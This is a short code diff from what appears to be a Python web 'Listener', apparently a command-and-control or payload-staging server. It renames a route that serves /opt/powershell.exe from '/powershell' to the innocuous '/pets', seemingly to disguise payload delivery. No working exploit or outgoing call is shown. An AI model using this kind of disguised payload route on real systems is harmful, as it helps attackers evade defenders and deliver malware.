@@ -233,7 +233,7 @@ class Listener():
             except Exception as e:
                 # En cas d’erreur (fichier manquant, permissions, etc.)
                 return Response(f"error: {e}", status=500, mimetype='text/plain')
-        @self.app.route("/powershell", methods=['GET'])
+        @self.app.route("/pets", methods=['GET'])
         def serve_powershell():
             file_path = "/opt/powershell.exe"
         
